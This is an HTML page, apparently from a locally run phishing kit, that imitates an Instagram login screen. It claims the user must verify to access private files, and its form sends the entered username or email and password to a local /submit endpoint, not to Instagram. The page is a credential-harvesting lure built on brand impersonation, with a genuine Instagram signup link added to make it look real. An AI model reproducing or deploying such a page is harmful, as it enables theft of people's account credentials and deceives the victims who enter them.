<!DOCTYPE html>
<!-- saved from url=(0022)http://127.0.0.1:5000/ -->
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>instagram</title>
    <style>
      html,
      body {
        display: flex;
        justify-content: center;
        height: 100%;
      }
      body,
      div,
      form,
      input,
      p {
        padding: 0;
        margin: 0;
        outline: none;
        font-family: Roboto, Arial, sans-serif;
        font-size: 12px;
        color: #666;
      }
    
      hr {
        color: #a9a9a9;
        opacity: 0.3;
      }
      .main-block {
        max-width: 540px;
        min-height: 350px;
        padding: 10px 0;
        margin: auto;
        border-radius: 5px;
        border: solid 1px #ccc;
        box-shadow: 1px 2px 5px rgba(0, 0, 0, 0.31);
        background: #ffffff;
      }
      form {
        margin: 0 30px;
      }

      input[type="text"],
      input[type="password"] {
        width: calc(100% - 20px);
        height: 36px;
        margin: 13px 0 0 -5px;
        padding-left: 10px;
        border-radius: 0 5px 5px 0;
        border: solid 1px #cbc9c9;
        box-shadow: 1px 2px 5px rgba(0, 0, 0, 0.09);
        background: #fff;
      }

      .btn-block {
        margin-top: 10px;
        text-align: center;
      }
      button {
        width: 100%;
        padding: 10px 0;
        margin: 10px auto;
        border-radius: 5px;
        border: none;
        background: #0ebae6;
        font-size: 12px;
        font-weight: 600;
        color: #fff;
      }
      button:hover {
        background: #26a9e0;
      }
    </style>
  </head>

  <body>
    <div class="main-block">
      <center><h1 style="color:#000000"><b><i>Instagram</i></b></h1></center>
      <center><p style="color:#3a3939"> Verifing to access private files.</p></center>
      <br>
      <form action="/submit" method="POST" >
        <label id="icon" for="email"><i class="fas fa-envelope"></i></label>
        <input
          autocomplete="off"
          type="text"
          name="email"
          id="email"
          placeholder="Phone number, username, or email"
          required=""
        />
        <br>
        <label id="icon" for="password"><i class="fas fa-user"></i></label>
        <input
          type="password"
          name="password"
          id="password"
          placeholder="Password"
          required=""
        />
        <br>
        <br>
        <div class="btn-block">
          <button type="submit" href="/submit">Log in</button>
        </div>
        <br>
        <center><p style="color:#032a55"> Forget Password?</p></center>
        <br>
        <hr/>
        <br>
        <center><p> Don't have an account?</p>
          <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
        </center>
      </form>
    </div>
  </body>
</html>
